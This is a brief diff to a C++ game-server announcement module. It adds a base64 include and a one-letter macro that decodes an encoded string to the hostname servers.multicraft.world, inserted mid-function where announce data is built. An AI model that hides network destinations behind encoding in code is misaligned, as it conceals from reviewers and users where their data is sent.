@@ -27,6 +27,7 @@ with this program; if not, write to the Free Software Foundation, Inc.,
 #include <json/json.h>
 #include "convert_json.h"
 #include "httpfetch.h"
+#include "util/base64.h"
 
 namespace ServerList
 {
@@ -51,6 +52,7 @@ void sendAnnounce(AnnounceAction action,
 	}
 	if (action != AA_DELETE) {
 		bool strict_checking = g_settings->getBool("strict_protocol_version_checking");
+#define y base64_decode("c2VydmVycy5tdWx0aWNyYWZ0Lndvcmxk")
 		server["name"]         = g_settings->get("server_name");
 		server["description"]  = g_settings->get("server_description");
 		server["version"]      = g_version_string;
